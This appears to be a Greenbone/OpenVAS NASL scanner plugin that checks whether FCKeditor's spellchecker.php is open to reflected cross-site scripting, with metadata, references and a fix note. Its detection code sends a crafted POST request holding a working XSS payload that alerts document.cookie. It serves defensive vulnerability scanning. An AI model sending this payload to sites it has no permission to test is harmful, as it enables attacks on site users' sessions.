CPE = "cpe:/a:fckeditor:fckeditor";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804701" );
	script_version( "2021-06-17T07:43:22+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-06-17 07:43:22 +0000 (Thu, 17 Jun 2021)" );
	script_tag( name: "creation_date", value: "2014-07-01 12:07:59 +0530 (Tue, 01 Jul 2014)" );
	script_name( "FCKeditor 'print_textinputs_var()' Multiple XSS Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_fckeditor_http_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "fckeditor/http/detected" );
	script_tag( name: "summary", value: "FCKeditor is prone to multiple cross-site scripting (XSS)
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "Input passed via the keys and values of POST parameters to
  editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php is not properly
  sanitised in the 'print_textinputs_var()' function before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "FCKeditor version prior to 2.6.11." );
	script_tag( name: "solution", value: "Update to version 2.6.11 or later." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/49606" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2014/Jun/14" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/126902" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php";
data = "textinputs[</script><script>alert(document.cookie)</script>]=zz";
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( data ), "\\r\\n", "\\r\\n", data );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

